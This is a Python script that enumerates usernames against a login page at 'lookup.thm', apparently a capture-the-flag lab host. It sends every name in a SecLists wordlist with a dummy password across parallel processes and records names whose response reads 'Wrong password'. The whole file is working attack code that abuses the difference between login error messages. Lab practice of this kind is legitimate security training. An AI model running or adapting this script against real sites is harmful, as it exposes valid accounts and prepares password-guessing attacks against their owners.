import requests
from multiprocessing import Pool, cpu_count
from tqdm import tqdm

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/SecLists/names.txt'

def user_check(name):
    data = {"username": name, "password": "password"}
    try:
        response = requests.post(target, data=data, timeout=5)
        if "Wrong password" in response.text:
            print(f"\n[+] User found: {name}")
    except:
        pass

if __name__ == '__main__':
    try:
        with open(username_file, 'r') as user_file:
            users = [u.strip() for u in user_file.readlines()]

        with Pool(processes=cpu_count()) as pool:
            list(tqdm(pool.imap_unordered(user_check, users), total=len(users)))
    except FileNotFoundError:
        print(f'Error: File path {username_file} does not exist.')




